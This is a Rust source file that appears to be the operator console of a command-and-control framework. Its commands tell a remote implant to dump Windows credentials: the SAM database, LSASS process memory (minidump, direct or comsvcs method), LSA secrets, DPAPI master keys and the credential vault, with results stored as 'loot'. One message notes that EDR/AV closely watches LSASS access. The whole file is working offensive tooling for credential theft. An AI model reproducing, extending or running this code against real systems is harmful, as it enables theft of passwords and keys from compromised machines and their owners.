//! Credential harvesting commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_error, print_info, print_success};

/// Dump SAM database
pub async fn sam(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping SAM database... (requires SYSTEM privileges)");

    let task = protocol::CredentialTask {
        operation: Some(protocol::credential_task::Operation::Sam(protocol::CredDumpSam {
            use_shadow_copy: false,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "creds", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be stored in loot");

    Ok(())
}

/// Dump LSASS process memory
pub async fn lsass(cli: &CliState, method: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let method_str = method.unwrap_or("minidump");

    // Validate method
    match method_str {
        "minidump" | "direct" | "comsvcs" => {}
        other => {
            print_error(&format!("Unknown method: {}. Use: minidump, direct, comsvcs", other));
            return Ok(());
        }
    }

    print_info(&format!("Dumping LSASS using method: {}", method_str));
    print_error("HIGH RISK: LSASS access is heavily monitored by EDR/AV solutions");

    let task = protocol::CredentialTask {
        operation: Some(protocol::credential_task::Operation::Lsass(protocol::CredDumpLsass {
            method: method_str.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "creds", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be stored in loot");

    Ok(())
}

/// Dump LSA secrets
pub async fn secrets(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping LSA secrets... (requires SYSTEM privileges)");

    let task = protocol::CredentialTask {
        operation: Some(protocol::credential_task::Operation::Secrets(protocol::CredDumpSecrets {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "creds", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be stored in loot");

    Ok(())
}

/// Dump DPAPI master keys
pub async fn dpapi(cli: &CliState, target_user: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    if let Some(user) = target_user {
        print_info(&format!("Dumping DPAPI master keys for user: {}", user));
    } else {
        print_info("Dumping DPAPI master keys for current user...");
    }

    let task = protocol::CredentialTask {
        operation: Some(protocol::credential_task::Operation::Dpapi(protocol::CredDumpDpapi {
            target_user: target_user.map(|u| u.to_string()),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "creds", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be stored in loot");

    Ok(())
}

/// Dump Windows credential vault
pub async fn vault(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping Windows credential vault...");

    let task = protocol::CredentialTask {
        operation: Some(protocol::credential_task::Operation::Vault(protocol::CredDumpVault {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "creds", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be stored in loot");

    Ok(())
}
